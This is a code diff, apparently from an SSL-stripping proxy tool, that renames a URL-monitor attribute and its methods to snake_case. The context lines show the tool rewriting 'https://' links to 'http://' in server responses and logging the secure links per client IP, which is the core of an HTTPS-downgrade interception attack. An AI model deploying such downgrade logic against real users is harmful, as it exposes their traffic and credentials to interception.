@@ -44,7 +44,7 @@ class ServerConnection(HTTPClient):
         self.postData         = postData
         self.headers          = headers
         self.client           = client
-        self.urlMonitor       = URLMonitor.getInstance()
+        self.url_monitor       = URLMonitor.get_instance()
         self.isImageRequest   = False
         self.isCompressed     = False
         self.contentLength    = None
@@ -149,7 +149,7 @@ class ServerConnection(HTTPClient):
 
             url = url.replace('https://', 'http://', 1)
             url = url.replace('&amp;', '&')
-            self.urlMonitor.addSecureLink(self.client.getClientIP(), url)
+            self.url_monitor.add_secure_link(self.client.getClientIP(), url)
 
         data = re.sub(ServerConnection.urlExplicitPort, r'http://\1/', data)
         return re.sub(ServerConnection.urlType, 'http://', data)
